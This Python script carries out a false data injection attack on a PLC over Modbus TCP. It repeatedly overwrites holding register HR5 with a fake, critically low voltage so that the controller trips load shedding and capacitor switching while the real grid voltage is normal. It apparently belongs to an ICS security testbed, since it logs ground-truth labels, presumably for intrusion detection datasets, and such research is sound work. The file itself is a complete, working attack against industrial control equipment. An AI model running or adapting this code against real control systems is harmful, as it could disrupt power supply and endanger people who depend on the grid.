"""
Attack #1: FDI_Voltage_Injection (False Data Injection - Voltage)
==================================================================
Target register: HR5 (Min Voltage)
Technique: Overwrites the PLC's voltage reading with a fixed, critically
           low value.
Effect: The PLC believes the voltage has dropped to a dangerous level and
        triggers its protection logic (capacitor switching, load shedding)
        even though the real grid voltage is within normal limits.
MITRE ATT&CK for ICS: T0855 - Unauthorized Command Message
"""

import time
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from pymodbus.client import ModbusTcpClient
from attacks.config import (
    PLC_IP, PLC_PORT, UNIT_ID,
    HR5_MIN_VOLTAGE,
    ATTACK_LOOP_DELAY,
    LABEL_FDI_VOLTAGE
)

# ---------------------------------------------------------------------------
# Attack parameters
# ---------------------------------------------------------------------------
FAKE_VOLTAGE = 800       # 0.800 p.u. (real value is ~0.965 p.u.) - critically low
                         # Protection thresholds: 0.92 p.u. (shed), 0.88 p.u. (emergency)
                         # Reporting 0.800 trips every protection stage at once

ATTACK_NAME = "FDI_Voltage_Injection"
ATTACK_ID   = LABEL_FDI_VOLTAGE


def run_attack(duration_sec=600, label_manager=None):
    """
    Runs the FDI attack.

    Args:
        duration_sec: attack duration in seconds (default: 600)
        label_manager: LabelManager instance used for ground-truth logging
    """
    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)

    if not client.connect():
        print(f"[-] PLC connection failed: {PLC_IP}:{PLC_PORT}")
        return False

    print(f"{'='*65}")
    print(f"  ATTACK #{ATTACK_ID}: {ATTACK_NAME}")
    print(f"  Target: {PLC_IP}:{PLC_PORT} - Register HR{HR5_MIN_VOLTAGE}")
    print(f"  Injected value: {FAKE_VOLTAGE} (= {FAKE_VOLTAGE/1000:.3f} p.u.)")
    print(f"  Duration: {duration_sec}s ({duration_sec//60} min)")
    print(f"{'='*65}")

    if label_manager:
        label_manager.log_attack_start(
            ATTACK_ID, ATTACK_NAME,
            f"HR{HR5_MIN_VOLTAGE}={FAKE_VOLTAGE} ({FAKE_VOLTAGE/1000:.3f}pu)"
        )

    start_time = time.time()
    packet_count = 0

    try:
        while (time.time() - start_time) < duration_sec:
            try:
                client.write_register(
                    address=HR5_MIN_VOLTAGE,
                    value=FAKE_VOLTAGE
                )
                packet_count += 1
            except Exception as e:
                if packet_count % 50 == 0:
                    print(f"  [FDI] Reconnecting... ({e})")
                try:
                    client.close()
                    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
                    client.connect()
                except Exception:
                    pass
                time.sleep(0.5)
                continue

            if packet_count % 100 == 0:
                elapsed = time.time() - start_time
                remaining = duration_sec - elapsed
                print(f"  [FDI] packet #{packet_count} | "
                      f"HR{HR5_MIN_VOLTAGE}->{FAKE_VOLTAGE} | "
                      f"remaining: {remaining:.0f}s")

            time.sleep(ATTACK_LOOP_DELAY)

    except KeyboardInterrupt:
        print("\n  [FDI] Manual stop!")

    finally:
        elapsed = time.time() - start_time
        client.close()

        if label_manager:
            label_manager.log_attack_end(
                ATTACK_ID, ATTACK_NAME,
                f"{packet_count} packets, {elapsed:.1f}s"
            )

        print(f"\n  [FDI] Attack finished: {packet_count} packets, {elapsed:.1f}s")
        return True


if __name__ == "__main__":
    run_attack(duration_sec=60)
